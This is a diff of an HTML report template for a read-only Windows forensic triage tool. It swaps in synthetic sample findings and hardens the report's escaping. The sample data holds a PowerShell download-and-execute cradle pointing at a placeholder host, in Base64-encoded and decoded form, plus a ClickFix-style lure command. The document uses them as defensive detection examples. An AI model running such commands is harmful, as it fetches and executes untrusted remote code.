@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>WinForensicX · VICTIM01</title>
+<title>WinForensicX · LAB-PC01</title>
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 :root{
@@ -158,8 +158,9 @@ kbd{font-family:var(--mono);font-size:.82em;background:var(--card2);border:1px s
       <div class="rwrap"><svg viewBox="0 0 168 168" width="168" height="168">
         <circle cx="84" cy="84" r="72" fill="none" stroke="var(--line)" stroke-width="14"></circle>
         <circle id="ring" cx="84" cy="84" r="72" fill="none" stroke-width="14" stroke-linecap="round" transform="rotate(-90 84 84)"></circle>
-      </svg><div class="c"><b id="rn">0</b><small>RISK / 100</small></div></div>
+      </svg><div class="c"><b id="rn">0</b><small>COMPROMISE RISK</small></div></div>
       <div class="rlvl" id="lvl">&mdash;</div>
+      <div id="pos" style="font-size:12px;color:var(--faint);text-align:center"></div>
     </div>
     <div class="hd">
       <div class="k">Executive summary</div>
@@ -195,150 +196,163 @@ kbd{font-family:var(--mono);font-size:.82em;background:var(--card2);border:1px s
   <div class="sec" id="limits"><h2>Limitations &amp; how to read this</h2></div>
   <div class="cards" id="limwrap"></div>
 
-  <div class="sec" id="gaps"><h2>Collection gaps</h2></div>
+  <div class="sec" id="gaps"><h2>Collection &amp; analysis gaps</h2></div>
   <div id="gapwrap"></div>
+
+  <div class="sec" id="supp"><h2>Suppressed by allowlist</h2></div>
+  <div id="suppwrap"></div>
+
+  <div class="sec" id="custody"><h2>Case &amp; chain of custody</h2></div>
+  <div id="custwrap"></div>
 
   <div class="foot" id="foot"></div>
 </div>
 
 <script id="wfx-data" type="application/json">{
-  "tool": "WinForensicX 2.0.0",
-  "version": "2.0.0",
-  "generated": "2026-10-15T20:40:32.2327453Z",
-  "hostName": "VICTIM01",
+  "tool": "WinForensicX 2.1.0",
+  "version": "2.1.0",
+  "generated": "2026-11-03T17:23:11.3760318Z",
+  "hostName": "LAB-PC01",
   "host": {
-    "HostName": "VICTIM01",
-    "Os": "Windows 11 Pro 10.0.22631",
-    "Admin": true,
-    "Operator": "ir",
-    "PSVersion": "5.1.22621"
+    "HostName": "LAB-PC01",
+    "Os": "Windows 11 Pro 10.0.26100 — SYNTHETIC SAMPLE DATA",
+    "TimeZone": "UTC"
   },
   "risk": {
-    "Score": 93,
+    "Score": 77,
     "Level": "Critical"
   },
+  "posture": {
+    "Score": 0,
+    "Level": "Low"
+  },
+  "collected": "2026-11-03T10:00:00.000Z",
+  "case": {
+    "Id": "00000000-0000-0000-0000-000000000000",
+    "Mode": "reanalyze (sample)",
+    "Started": "2026-11-03T10:05:00.000Z",
+    "Operator": "analyst",
+    "OperatorHost": "IR-WORKSTATION",
+    "Admin": true,
+    "PowerShell": "7.4.6 Core",
+    "Parameters": {
+      "Mode": "Reanalyze",
+      "Hours": 72
+    },
+    "Sources": [
+      {
+        "role": "source-bundle",
+        "path": "E:\\cases\\WFX_LAB-PC01_20261103-100000Z\\raw\\bundle.json",
+        "sha256": "0000000000000000000000000000000000000000000000000000000000000000"
+      }
+    ],
+    "OutputOnSystemDrive": false
+  },
+  "suppressed": [],
   "summary": {
-    "Critical": 1,
+    "Critical": 0,
     "High": 5,
-    "Medium": 6,
-    "Low": 3,
-    "Info": 0
+    "Medium": 1,
+    "Low": 4,
+    "Info": 1
   },
   "findings": [
     {
-      "Id": "EXPO-GPP-CPASSWORD",
-      "Title": "Group Policy Preferences password (MS14-025): Groups.xml",
-      "Severity": "Critical",
-      "Confidence": "High",
-      "Score": 20.0,
-      "Category": "Exposure",
-      "Technique": [
-        "T1552.006"
-      ],
-      "Description": "A GPP XML file contains a cPassword. Microsoft published the decryption key in 2014, so any domain user can recover this password. It is one of the most reliable privilege-escalation findings in a Windows domain.",
-      "Entity": "exposure:GppCpassword:\\\\dc\\SYSVOL\\acme\\Groups.xml",
-      "Evidence": {
-        "Path": "\\\\dc\\SYSVOL\\acme\\Groups.xml"
-      },
-      "Recommendation": "Remove the GPP that sets the password, change the affected account's password, and apply KB2962486. Use Windows LAPS to manage local admin passwords instead.",
-      "Host": "VICTIM01",
-      "Time": null,
-      "Source": "exposure",
-      "Occurrences": 1
-    },
-    {
-      "Id": "POSTURE-AV-DISABLED",
-      "Title": "Antivirus real-time protection is OFF (no other AV present)",
-      "Severity": "High",
-      "Confidence": "High",
-      "Score": 10.0,
-      "Category": "Posture",
-      "Technique": [
-        "T1562.001"
-      ],
-      "Description": "Microsoft Defender real-time/antivirus protection is disabled and no third-party AV is registered. The host is running without active malware protection — this is often the first thing an intruder disables.",
-      "Entity": "posture:defender:rtp",
-      "Evidence": {
-        "RealTimeProtection": false,
-        "AntivirusEnabled": false,
-        "ThirdPartyAV": []
-      },
-      "Recommendation": "Re-enable real-time protection, confirm it was not disabled by malware or GPO, and review when and by what it was turned off.",
-      "Host": "VICTIM01",
-      "Time": null,
-      "Source": "posture",
-      "Occurrences": 1
-    },
-    {
-      "Id": "PROC-SYSNAME-WRONGPATH",
-      "Title": "System process name 'lsass.exe' running from an unusual path",
+      "Id": "LOTL-PS-DOWNLOAD-EXEC",
+      "Title": "PowerShell download-and-execute cradle (inside encoded command)",
       "Severity": "High",
       "Confidence": "High",
       "Score": 10.0,
       "Category": "Process",
       "Technique": [
-        "T1036.005"
+        "T1059.001",
+        "T1105"
       ],
-      "Description": "A process using the name of a core Windows binary is running from outside System32/SysWOW64. Malware often copies a trusted name to blend in.",
-      "Entity": "process:4412:lsass.exe",
+      "Description": "Content is downloaded and executed directly in memory in one command — the classic PowerShell stager / 'cradle' pattern. Also how ClickFix-style lures run their payload.",
+      "Entity": "process:4100:powershell.exe:decoded",
       "Evidence": {
-        "Pid": 4412,
-        "Process": "lsass.exe",
-        "Path": "C:\\Users\\bob\\AppData\\Local\\Temp\\lsass.exe",
-        "Parent": "explorer.exe"
+        "Pid": 4100,
+        "Process": "powershell.exe",
+        "Parent": "winword.exe",
+        "DecodedCommand": "irm https://example.invalid/t.txt | iex"
       },
-      "Recommendation": "Verify the image path and signature. The real lsass.exe runs only from the Windows system folders.",
-      "Host": "VICTIM01",
-      "Time": "2026-10-15T20:10:31.4855596Z",
+      "Recommendation": "Treat as likely malicious: capture the URL, retrieve the content safely for analysis, and trace the parent process.",
+      "Host": "LAB-PC01",
+      "Time": "2026-11-03T09:58:00Z",
       "Source": "process",
       "Occurrences": 1
     },
     {
-      "Id": "NET-TUNNEL-SERVICE",
-      "Title": "Connection to a tunneling service (ngrok.io)",
+      "Id": "EVT-1102-CLEARED",
+      "Title": "Security event log cleared",
       "Severity": "High",
-      "Confidence": "Medium",
-      "Score": 8.0,
-      "Category": "Network",
+      "Confidence": "High",
+      "Score": 10.0,
+      "Category": "EventLog",
       "Technique": [
-        "T1572",
-        "T1090"
+        "T1070.001"
       ],
-      "Description": "A connection to an ad-hoc tunneling service was found. Ad-hoc tunneling services expose internal services to the internet and are abused for C2 and data theft.",
-      "Entity": "conn:198.51.100.9:443",
+      "Description": "The Security log was cleared. Attackers do this to destroy evidence; it is almost never part of normal operations.",
+      "Entity": "event:EVT-1102-CLEARED:bob",
       "Evidence": {
-        "Pid": 5001,
-        "Process": "powershell.exe",
-        "Remote": "abc123.ngrok.io (198.51.100.9):443"
+        "EventId": 1102,
+        "Log": "Security",
+        "Time": "2026-11-03T09:59:00Z",
+        "Details": "bob"
       },
-      "Recommendation": "Identify the process and what it exposes; block the service if unauthorized.",
-      "Host": "VICTIM01",
-      "Time": null,
-      "Source": "network",
+      "Recommendation": "Find who cleared it and when, and recover logs from your SIEM or forwarded copies.",
+      "Host": "LAB-PC01",
+      "Time": "2026-11-03T09:59:00Z",
+      "Source": "evt:Security",
       "Occurrences": 1
     },
     {
-      "Id": "PROC-PARENT-SPOOF",
-      "Title": "lsass.exe has an unexpected parent (explorer.exe)",
+      "Id": "LOTL-CLICKFIX-LURE",
+      "Title": "Command carrying a fake-CAPTCHA / 'verify you are human' lure (ClickFix) (typed into the Run dialog)",
+      "Severity": "High",
+      "Confidence": "Medium",
+      "Score": 8.0,
+      "Category": "Execution",
+      "Technique": [
+        "T1204.004"
+      ],
+      "Description": "The command line contains social-engineering text used by ClickFix / fake-CAPTCHA lures, which trick users into pasting a command into the Run dialog or a terminal.",
+      "Entity": "autostart:RunMRU:RunMRU:a",
+      "Evidence": {
+        "Kind": "RunMRU",
+        "Name": "RunMRU:a",
+        "Location": "HKCU RunMRU",
+        "Command": "powershell -w h -c \"Write-Output x\" # I am not a robot - Verification ID 4471"
+      },
+      "Recommendation": "Treat as malicious: identify the website that delivered the lure and analyze what the command fetched.",
+      "Host": "LAB-PC01",
+      "Time": null,
+      "Source": "persistence",
+      "Occurrences": 1
+    },
+    {
+      "Id": "LOTL-PS-ENCODED",
+      "Title": "Encoded PowerShell command",
       "Severity": "High",
       "Confidence": "Medium",
       "Score": 8.0,
       "Category": "Process",
       "Technique": [
-        "T1055.012",
-        "T1036"
+        "T1059.001",
+        "T1027.010"
       ],
-      "Description": "Core Windows processes are started by a fixed parent. A different parent can indicate process hollowing or a masqueraded binary.",
-      "Entity": "process:4412:lsass.exe",
+      "Description": "PowerShell was started with a Base64-encoded command, which hides what it runs from casual review and many logs. Common in malware stagers and also used by some management tools.",
+      "Entity": "process:4100:powershell.exe",
       "Evidence": {
-        "Pid": 4412,
-        "Process": "lsass.exe",
-        "Parent": "explorer.exe",
-        "Path": "C:\\Users\\bob\\AppData\\Local\\Temp\\lsass.exe"
+        "Pid": 4100,
+        "Process": "powershell.exe",
+        "Parent": "winword.exe",
+        "CommandLine": "powershell -nop -w hidden -enc aQByAG0AIABoAHQAdABwAHMAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGkAbgB2AGEAbABpAGQALwB0AC4AdAB4AHQAIAB8ACAAaQBlAHgA",
+        "Path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
       },
-      "Recommendation": "Expected parent for lsass.exe is wininit.exe. Investigate the parent process.",
-      "Host": "VICTIM01",
-      "Time": "2026-10-15T20:10:31.4855596Z",
+      "Recommendation": "Decode the payload (ConvertFrom-WfxEncodedCommand) and review it; identify the parent process that launched it.",
+      "Host": "LAB-PC01",
+      "Time": "2026-11-03T09:58:00Z",
       "Source": "process",
       "Occurrences": 1
     },
@@ -354,131 +368,17 @@ kbd{font-family:var(--mono);font-size:.82em;background:var(--card2);border:1px s
         "T1059.001"
       ],
       "Description": "An Office application started a scripting tool. This is the classic result of a malicious document or a browser exploit/ClickFix lure.",
-      "Entity": "process:5001:powershell.exe",
+      "Entity": "process:4100:powershell.exe",
       "Evidence": {
-        "Pid": 5001,
+        "Pid": 4100,
         "Process": "powershell.exe",
         "Parent": "winword.exe",
-        "CommandLine": "powershell -nop -w hidden -enc SQBFAFgA",
-        "ParentCommandLine": "WINWORD.EXE"
+        "CommandLine": "powershell -nop -w hidden -enc aQByAG0AIABoAHQAdABwAHMAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGkAbgB2AGEAbABpAGQALwB0AC4AdAB4AHQAIAB8ACAAaQBlAHgA",
+        "ParentCommandLine": ""
       },
       "Recommendation": "Review the command line and what winword.exe opened (recent documents / browser history) just before this ran.",
-      "Host": "VICTIM01",
-      "Time": "2026-10-15T20:20:31.4884713Z",
-      "Source": "process",
-      "Occurrences": 1
-    },
-    {
-      "Id": "POSTURE-NO-SCRIPTBLOCK-LOG",
-      "Title": "PowerShell script-block logging is off",
-      "Severity": "Medium",
-      "Confidence": "High",
-      "Score": 5.0,
-      "Category": "Visibility",
-      "Technique": [
-        "T1562.002"
-      ],
-      "Description": "PowerShell Script Block Logging (4104) is disabled, so malicious/obfuscated PowerShell leaves little forensic trace. PowerShell is one of the most abused tools in intrusions.",
-      "Entity": "posture:audit:sbl",
-      "Evidence": {
-        "ScriptBlockLogging": false
-      },
-      "Recommendation": "Enable Script Block Logging via GPO (Administrative Templates \u003e Windows Components \u003e Windows PowerShell).",
-      "Host": "VICTIM01",
-      "Time": null,
-      "Source": "posture",
-      "Occurrences": 1
-    },
-    {
-      "Id": "POSTURE-NO-PROCESS-AUDIT",
-      "Title": "Process-creation auditing is off (4688 / Sysmon absent)",
-      "Severity": "Medium",
-      "Confidence": "High",
-      "Score": 5.0,
-      "Category": "Visibility",
-      "Technique": [
-        "T1562.002"
-      ],
-      "Description": "Neither Security 4688 process-creation auditing nor Sysmon is active. Most process-based detections in this tool and in any SIEM are blind on this host — absence of findings here does not mean absence of activity.",
-      "Entity": "posture:audit:proc",
-      "Evidence": {
-        "ProcessCreationAudit": false,
-        "Sysmon": false
-      },
-      "Recommendation": "Enable 'Audit Process Creation' (Success) via GPO, or deploy Sysmon. Also enable command-line auditing.",
-      "Host": "VICTIM01",
-      "Time": null,
-      "Source": "posture",
-      "Occurrences": 1
-    },
-    {
-      "Id": "LOTL-PS-HIDDEN-BYPASS",
-      "Title": "PowerShell launched hidden with policy bypass",
-      "Severity": "Medium",
-      "Confidence": "Medium",
-      "Score": 4.0,
-      "Category": "Process",
-      "Technique": [
-        "T1059.001"
-      ],
-      "Description": "Hidden window plus execution-policy bypass or no profile is typical of scripted attacks, though some admin tools do this too.",
-      "Entity": "process:5001:powershell.exe",
-      "Evidence": {
-        "Pid": 5001,
-        "Process": "powershell.exe",
-        "Parent": "winword.exe",
-        "CommandLine": "powershell -nop -w hidden -enc SQBFAFgA",
-        "Path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-      },
-      "Recommendation": "Check the script or command being run, and whether the parent (e.g. Office, browser, scheduled task) is expected.",
-      "Host": "VICTIM01",
-      "Time": "2026-10-15T20:20:31.4884713Z",
-      "Source": "process",
-      "Occurrences": 1
-    },
-    {
-      "Id": "POSTURE-DEFENDER-EXCLUSION",
-      "Title": "Suspicious Defender exclusion: C:\\Users\\Public",
-      "Severity": "Medium",
-      "Confidence": "Medium",
-      "Score": 4.0,
-      "Category": "Posture",
-      "Technique": [
-        "T1562.001"
-      ],
-      "Description": "Defender is configured to ignore 'C:\\Users\\Public'. Broad or user-writable exclusions are a classic way for an attacker to make a folder where their tools won't be scanned. Verify it was set intentionally.",
-      "Entity": "posture:defender:exclusion:C:\\Users\\Public",
-      "Evidence": {
-        "Exclusion": "C:\\Users\\Public"
-      },
-      "Recommendation": "Confirm the business reason for this exclusion; remove it if unexplained and scan the excluded location.",
-      "Host": "VICTIM01",
-      "Time": null,
-      "Source": "posture",
-      "Occurrences": 1
-    },
-    {
-      "Id": "PROC-UNSIGNED-USERPATH",
-      "Title": "Unsigned process running from a user-writable folder: lsass.exe",
-      "Severity": "Medium",
-      "Confidence": "Medium",
-      "Score": 4.0,
-      "Category": "Process",
-      "Technique": [
-        "T1036"
-      ],
-      "Description": "An unsigned or untrusted executable is running from a location any user can write to — a common staging pattern for malware.",
-      "Entity": "process:4412:lsass.exe",
-      "Evidence": {
-        "Pid": 4412,
-        "Process": "lsass.exe",
-        "Path": "C:\\Users\\bob\\AppData\\Local\\Temp\\lsass.exe",
-        "Signature": "NotSigned",
-        "Parent": "explorer.exe"
-      },
-      "Recommendation": "Hash the file and check it against threat intelligence; confirm the publisher.",
-      "Host": "VICTIM01",
-      "Time": "2026-10-15T20:10:31.4855596Z",
+      "Host": "LAB-PC01",
+      "Time": "2026-11-03T09:58:00Z",
       "Source": "process",
       "Occurrences": 1
     },
@@ -502,51 +402,85 @@ kbd{font-family:var(--mono);font-size:.82em;background:var(--card2);border:1px s
         "Digits": 3
       },
       "Recommendation": "Check reputation and resolution history; correlate with connections from the resolving process.",
-      "Host": "VICTIM01",
+      "Host": "LAB-PC01",
       "Time": null,
       "Source": "dns",
       "Occurrences": 1
     },
     {
-      "Id": "POSTURE-NO-CMDLINE-AUDIT",
-      "Title": "Command-line logging in 4688 is disabled",
-      "Severity": "Low",
-      "Confidence": "High",
-      "Score": 2.0,
-      "Category": "Visibility",
-      "Technique": [
-        "T1562.002"
-      ],
-      "Description": "Process-creation events will not include command lines, so encoded/abusive command lines cannot be reviewed after the fact.",
-      "Entity": "posture:audit:cmdline",
-      "Evidence": {
-        "CommandLineAudit": false
-      },
-      "Recommendation": "Enable 'Include command line in process creation events' via GPO.",
-      "Host": "VICTIM01",
-      "Time": null,
-      "Source": "posture",
-      "Occurrences": 1
-    },
-    {
-      "Id": "POSTURE-TAMPER-OFF",
-      "Title": "Defender Tamper Protection is off",
+      "Id": "LOTL-PS-DOWNLOAD",
+      "Title": "PowerShell downloading content from the web (inside encoded command)",
       "Severity": "Low",
       "Confidence": "Medium",
       "Score": 1.6,
-      "Category": "Posture",
+      "Category": "Process",
       "Technique": [
-        "T1562.001"
+        "T1105",
+        "T1059.001"
       ],
-      "Description": "Tamper Protection is disabled, so Defender settings can be changed by local admin tools or malware without resistance.",
-      "Entity": "posture:defender:tamper",
+      "Description": "A PowerShell command line fetches content from a URL. Normal for admin scripts; also the first step of most download-and-run attacks.",
+      "Entity": "process:4100:powershell.exe:decoded",
       "Evidence": {
-        "TamperProtection": false
+        "Pid": 4100,
+        "Process": "powershell.exe",
+        "Parent": "winword.exe",
+        "DecodedCommand": "irm https://example.invalid/t.txt | iex"
       },
-      "Recommendation": "Enable Tamper Protection (Windows Security \u003e Virus \u0026 threat protection settings).",
-      "Host": "VICTIM01",
+      "Recommendation": "Check the URL's reputation and what was done with the downloaded content.",
+      "Host": "LAB-PC01",
+      "Time": "2026-11-03T09:58:00Z",
+      "Source": "process",
+      "Occurrences": 1
+    },
+    {
+      "Id": "LOTL-PS-HIDDEN-WINDOW",
+      "Title": "PowerShell launched with a hidden window",
+      "Severity": "Low",
+      "Confidence": "Medium",
+      "Score": 1.6,
+      "Category": "Process",
+      "Technique": [
+        "T1059.001",
+        "T1564.003"
+      ],
+      "Description": "PowerShell was asked to run with no visible window. Legitimate scheduled jobs do this, but so does most malicious PowerShell.",
+      "Entity": "process:4100:powershell.exe",
+      "Evidence": {
+        "Pid": 4100,
+        "Process": "powershell.exe",
+        "Parent": "winword.exe",
+        "CommandLine": "powershell -nop -w hidden -enc aQByAG0AIABoAHQAdABwAHMAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGkAbgB2AGEAbABpAGQALwB0AC4AdAB4AHQAIAB8ACAAaQBlAHgA",
+        "Path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      },
+      "Recommendation": "Review the full command line and the parent process.",
+      "Host": "LAB-PC01",
+      "Time": "2026-11-03T09:58:00Z",
+      "Source": "process",
+      "Occurrences": 1
+    },
+    {
+      "Id": "LOTL-PS-HIDDEN-WINDOW",
+      "Title": "PowerShell launched with a hidden window (typed into the Run dialog)",
+      "Severity": "Low",
+      "Confidence": "Medium",
+      "Score": 1.6,
+      "Category": "Execution",
+      "Technique": [
+        "T1059.001",
+        "T1564.003"
+      ],
+      "Description": "PowerShell was asked to run with no visible window. Legitimate scheduled jobs do this, but so does most malicious PowerShell.",
+      "Entity": "autostart:RunMRU:RunMRU:a",
+      "Evidence": {
+        "Kind": "RunMRU",
+        "Name": "RunMRU:a",
+        "Location": "HKCU RunMRU",
+        "Command": "powershell -w h -c \"Write-Output x\" # I am not a robot - Verification ID 4471"
+      },
+      "Recommendation": "Review the full command line and the parent process.",
+      "Host": "LAB-PC01",
       "Time": null,
-      "Source": "posture",
+      "Source": "persistence",
       "Occurrences": 1
     },
     {
@@ -566,30 +500,40 @@ kbd{font-family:var(--mono);font-size:.82em;background:var(--card2);border:1px s
         "TLD": ".top"
       },
       "Recommendation": "Check the domain's reputation and which process resolved it.",
-      "Host": "VICTIM01",
+      "Host": "LAB-PC01",
       "Time": null,
       "Source": "dns",
+      "Occurrences": 1
+    },
+    {
+      "Id": "PROC-ENCODED-DECODED",
+      "Title": "Decoded PowerShell payload (powershell.exe, pid 4100)",
+      "Severity": "Info",
+      "Confidence": "High",
+      "Score": 0.0,
+      "Category": "Process",
+      "Technique": [
+        "T1027.010"
+      ],
+      "Description": "The encoded command was decoded for review (decoding only; nothing was executed).",
+      "Entity": "process:4100:powershell.exe:payload",
+      "Evidence": {
+        "Pid": 4100,
+        "DecodedCommand": "irm https://example.invalid/t.txt | iex"
+      },
+      "Recommendation": "Read the decoded script; correlate with 4104 script-block logs.",
+      "Host": "LAB-PC01",
+      "Time": "2026-11-03T09:58:00Z",
+      "Source": "process",
       "Occurrences": 1
     }
   ],
   "coverage": [
     {
-      "Id": "T1036",
-      "Name": "Masquerading",
+      "Id": "T1027.010",
+      "Name": "Obfuscated Files or Information: Command Obfuscation",
       "Tactic": "Defense Evasion",
-      "Url": "https://attack.mitre.org/techniques/T1036/"
-    },
-    {
-      "Id": "T1036.005",
-      "Name": "Masquerading: Match Legitimate Resource Name or Location",
-      "Tactic": "Defense Evasion",
-      "Url": "https://attack.mitre.org/techniques/T1036/005/"
-    },
-    {
-      "Id": "T1055.012",
-      "Name": "Process Injection: Process Hollowing",
-      "Tactic": "Defense Evasion",
-      "Url": "https://attack.mitre.org/techniques/T1055/012/"
+      "Url": "https://attack.mitre.org/techniques/T1027/010/"
     },
     {
       "Id": "T1059.001",
@@ -598,16 +542,22 @@ kbd{font-family:var(--mono);font-size:.82em;background:var(--card2);border:1px s
       "Url": "https://attack.mitre.org/techniques/T1059/001/"
     },
     {
+      "Id": "T1070.001",
+      "Name": "Indicator Removal: Clear Windows Event Logs",
+      "Tactic": "Defense Evasion",
+      "Url": "https://attack.mitre.org/techniques/T1070/001/"
+    },
+    {
       "Id": "T1071.004",
       "Name": "Application Layer Protocol: DNS",
       "Tactic": "Command and Control",
       "Url": "https://attack.mitre.org/techniques/T1071/004/"
     },
     {
-      "Id": "T1090",
-      "Name": "Proxy",
+      "Id": "T1105",
+      "Name": "Ingress Tool Transfer",
       "Tactic": "Command and Control",
-      "Url": "https://attack.mitre.org/techniques/T1090/"
+      "Url": "https://attack.mitre.org/techniques/T1105/"
     },
     {
       "Id": "T1204.002",
@@ -616,54 +566,42 @@ kbd{font-family:var(--mono);font-size:.82em;background:var(--card2);border:1px s
       "Url": "https://attack.mitre.org/techniques/T1204/002/"
     },
     {
-      "Id": "T1552.006",
-      "Name": "Unsecured Credentials: Group Policy Preferences",
-      "Tactic": "Credential Access",
-      "Url": "https://attack.mitre.org/techniques/T1552/006/"
+      "Id": "T1204.004",
+      "Name": "User Execution: Malicious Copy and Paste",
+      "Tactic": "Execution",
+      "Url": "https://attack.mitre.org/techniques/T1204/004/"
     },
     {
-      "Id": "T1562.001",
-      "Name": "Impair Defenses: Disable or Modify Tools",
+      "Id": "T1564.003",
+      "Name": "Hide Artifacts: Hidden Window",
       "Tactic": "Defense Evasion",
-      "Url": "https://attack.mitre.org/techniques/T1562/001/"
-    },
-    {
-      "Id": "T1562.002",
-      "Name": "Impair Defenses: Disable Windows Event Logging",
-      "Tactic": "Defense Evasion",
-      "Url": "https://attack.mitre.org/techniques/T1562/002/"
+      "Url": "https://attack.mitre.org/techniques/T1564/003/"
     },
     {
       "Id": "T1568.002",
       "Name": "Dynamic Resolution: Domain Generation Algorithms",
       "Tactic": "Command and Control",
       "Url": "https://attack.mitre.org/techniques/T1568/002/"
-    },
-    {
-      "Id": "T1572",
-      "Name": "Protocol Tunneling",
-      "Tactic": "Command and Control",
-      "Url": "https://attack.mitre.org/techniques/T1572/"
     }
   ],
-  "gaps": [
-    {
-      "Source": "events:Security",
-      "Reason": "Access denied (needs admin)",
-      "Fix": "Run elevated"
-    }
-  ],
-  "meta": null,
+  "gaps": [],
+  "meta": {
+    "Mode": "synthetic"
+  },
   "limits": [
     "Findings are LEADS for an analyst, not verdicts. A finding means \"look here,\" not \"this host is compromised.\"",
     "Read findings alongside the collection gaps: with no process auditing and no Sysmon, \"nothing found\" mostly means \"nothing could be seen\" - the report says so.",
     "It is a TRIAGE tool, not a forensic imager. It does not acquire disk/memory images or carve deleted files.",
-    "Detections are heuristic: expect some false positives and false negatives. Tune with custom rule packs ($env:WFX_RULES) and allowlist by finding Id + Entity.",
+    "Detections are heuristic: expect some false positives and false negatives. Tune with custom rule packs ($env:WFX_RULES) and an allowlist (-AllowlistPath / $env:WFX_ALLOWLIST).",
+    "Two scores: Compromise risk (evidence of attacker activity) and Posture (hardening/visibility gaps). A clean but un-hardened host scores low risk, high posture.",
+    "Only loaded user registry hives (logged-on users) are inspected; event collection is capped per query and caps are reported as gaps.",
     "Administrator rights are recommended; without them some data is unavailable (recorded as gaps). Remote mode needs WinRM enabled on the target.",
-    "It will not extract, decrypt, or dump secrets - that is a deliberate boundary, not a missing feature."
+    "It will not extract, decrypt, or dump secrets - that is a deliberate boundary, not a missing feature.",
+    "The manifest is not signed: record its SHA-256 (printed at the end of each run) out-of-band to make the case tamper-evident."
   ],
   "safety": [
-    "Strictly read-only: it observes, it does not change the host.",
+    "Read-only: it changes no settings and executes nothing it finds. It sends no network traffic of its own (remote mode uses WinRM you initiate; -ExposureScan reads the domain SYSVOL share).",
+    "Its only writes are its own case folder (default Desktop\\WinForensicX) — use -OutputPath on external media for evidence work. Reading files can update NTFS last-access times.",
     "Credential exposure is AUDITED, never extracted: it reports THAT a secret is exposed with the value redacted to type + length.",
     "No LSASS dumping, no SAM/NTDS hash parsing, no DPAPI/browser decryption, no exfiltration.",
     "Command lines, event messages and file contents are secret-scrubbed at collection time, so the raw bundle is safe to keep and ship."
@@ -677,7 +615,10 @@ kbd{font-family:var(--mono);font-size:.82em;background:var(--card2);border:1px s
   var SEV=['Critical','High','Medium','Low','Info'], RK={Critical:0,High:1,Medium:2,Low:3,Info:4};
   var el=function(id){return document.getElementById(id);};
   var esc=function(s){var d=document.createElement('div');d.textContent=(s==null?'':String(s));return d.innerHTML;};
-  var au=function(id){return 'https://attack.mitre.org/techniques/'+String(id).replace('.','/')+'/';};
+  // ATT&CK links are only built from well-formed ids; anything else is shown as plain text.
+  var TID=/^T\d{4}(?:\.\d{3})?$/;
+  var au=function(id){id=String(id);return TID.test(id)?'https://attack.mitre.org/techniques/'+id.replace('.','/')+'/':'';};
+  var tlink=function(id,inner){var u=au(id);return u?'<a href="'+esc(u)+'" target="_blank" rel="noopener noreferrer">'+inner+'</a>':'<span>'+inner+'</span>';};
   var why=function(f){var d=(f.Description||'').trim();if(d.length>135)d=d.slice(0,132).replace(/\s+\S*$/,'')+'…';return d;};
   var F=(D.findings||[]).slice();
   var COL={Critical:'var(--crit)',High:'var(--high)',Medium:'var(--med)',Low:'var(--low)',Info:'var(--info)'};
@@ -698,7 +639,10 @@ kbd{font-family:var(--mono);font-size:.82em;background:var(--card2);border:1px s
   var lvl=el('lvl');lvl.textContent=risk.Level;lvl.style.color=vc;lvl.style.background='color-mix(in srgb,'+vc+' 15%,transparent)';
   var ch=F.filter(function(f){return f.Severity==='Critical'||f.Severity==='High';}).length;
   el('verdict').textContent=(risk.Level==='Critical'||risk.Level==='High')?'Immediate investigation recommended':(risk.Level==='Elevated'?'Review advised':'No urgent action — monitor');
-  el('blurb').textContent='Host '+(D.hostName||'this host')+' scored '+risk.Score+'/100 with '+ch+' high-severity indicator'+(ch===1?'':'s')+' across credential exposure, process tradecraft, network C2 and security posture. Findings are leads for an analyst — confirm before acting, and read them alongside the visibility gaps below.';
+  var pos=D.posture||{Score:0,Level:'Low'};
+  var cats={};F.forEach(function(f){cats[f.Category]=1;});
+  el('pos').textContent='Hardening / visibility gaps: '+pos.Score+'/100 ('+pos.Level+')';
+  el('blurb').textContent='Compromise risk '+risk.Score+'/100 ('+risk.Level+'), with '+ch+' critical/high finding'+(ch===1?'':'s')+(Object.keys(cats).length?' in: '+Object.keys(cats).sort().join(', '):'')+'. Hardening/visibility gaps score '+pos.Score+'/100 separately. Findings are leads for an analyst — confirm before acting, and read them alongside the collection gaps below.';
   var byScore=F.slice().sort(function(a,b){return RK[a.Severity]-RK[b.Severity]||b.Score-a.Score;});
   el('actions').innerHTML=byScore.slice(0,3).map(function(f){return '<div class="it"><span class="dot" style="background:'+COL[f.Severity]+'"></span><div><b>'+esc(f.Title)+'</b><span>'+esc((f.Recommendation||'').split('. ')[0].replace(/\.$/,''))+'.</span></div></div>';}).join('')||'<div class="empty">No priority actions.</div>';
 
@@ -725,13 +669,13 @@ kbd{font-family:var(--mono);font-size:.82em;background:var(--card2);border:1px s
       rows+='<tr><td class="k">'+esc(k)+'</td><td class="v">'+v+'</td></tr>';});
     return '<table class="kv">'+rows+'</table>';}
   function card(f){
-    var tech=(f.Technique||[]).map(function(t){return '<a href="'+au(t)+'" target="_blank" rel="noopener">'+esc(t)+'</a>';}).join('');
+    var tech=(f.Technique||[]).map(function(t){return tlink(t,esc(t));}).join('');
     var occ=(f.Occurrences&&f.Occurrences>1)?('  ×'+f.Occurrences):'';
     var d=document.createElement('div');d.className='f';
-    d.innerHTML='<div class="fhead"><div class="pill bg-'+f.Severity+'">'+f.Severity.toUpperCase()+'</div>'+
+    d.innerHTML='<div class="fhead"><div class="pill bg-'+esc(f.Severity)+'">'+esc(String(f.Severity).toUpperCase())+'</div>'+
       '<div class="mid"><div class="ti">'+esc(f.Title)+'</div><div class="wy">'+esc(why(f))+'</div>'+
         '<div class="tags"><span class="cat">'+esc(f.Category)+'</span>'+tech+'</div></div>'+
-      '<div class="rt"><div class="sc fg-'+f.Severity+'">'+f.Score+occ+'</div><div class="id">'+esc(f.Id)+'</div></div></div>'+
+      '<div class="rt"><div class="sc fg-'+esc(f.Severity)+'">'+esc(f.Score)+esc(occ)+'</div><div class="id">'+esc(f.Id)+'</div></div></div>'+
       '<div class="fbody"><p>'+esc(f.Description)+'</p>'+
